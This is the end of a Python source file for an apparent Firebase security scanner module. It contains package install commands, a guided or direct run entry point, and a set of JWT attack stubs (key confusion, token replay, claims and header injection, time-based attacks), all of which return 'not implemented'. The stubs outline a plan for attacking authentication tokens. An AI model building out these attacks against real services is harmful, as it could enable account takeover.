                "apt-get update",
                "apt-get install -y python3 python3-pip",
                "apt-get install -y python3-requests"
            ]
        else:
            # For other package managers, return an empty list or a generic pip command.
            # Returning empty is safer to avoid making incorrect assumptions.
            return []

    def _get_update_command(self, pkg_manager: str) -> List[str]:
        """Return update commands"""
        return ["pip3 install --upgrade requests"]

    def _get_uninstall_command(self, pkg_manager: str) -> List[str]:
        """Return uninstallation commands"""
        return ["pip3 uninstall requests -y"]

    def _test_key_confusion(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test key confusion attacks"""
        return {'success': False, 'error': 'Key confusion attack not implemented'}

    def _test_public_key_recovery(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test public key recovery attacks"""
        return {'success': False, 'error': 'Public key recovery not implemented'}

    def _test_token_replay(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test token replay attacks"""
        return {'success': False, 'error': 'Token replay attack not implemented'}

    def _test_custom_claims_injection(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test custom claims injection"""
        return {'success': False, 'error': 'Custom claims injection not implemented'}

    def _test_header_injection(self, token: str, analysis: Dict, api_key: str) -> Dict:
        """Test header parameter injection"""
        return {'success': False, 'error': 'Header injection not implemented'}

    def _test_cross_jwt_confusion(self, token: str, analysis: Dict, api_key: str) -> Dict:
        """Test cross-JWT confusion attacks"""
        return {'success': False, 'error': 'Cross-JWT confusion not implemented'}

    def _test_time_based_attacks(self, token: str, analysis: Dict, api_key: str) -> Dict:
        """Test time-based JWT attacks"""
        return {'success': False, 'error': 'Time-based attacks not implemented'}

# For backward compatibility
def get_tool():
    """Legacy function to get tool instance"""
    return FirebaseScannerModule()

if __name__ == "__main__":
    tool = FirebaseScannerModule()
    
    # Conditional import and use of sys
    try:
        import sys as local_sys
        if len(local_sys.argv) > 1 and local_sys.argv[1] == "direct":
            tool.run_direct()
        else:
            tool.run_guided()
    except ImportError:
        print("Error: 'sys' module not found. Cannot process command-line arguments. Running guided mode by default.")
        tool.run_guided()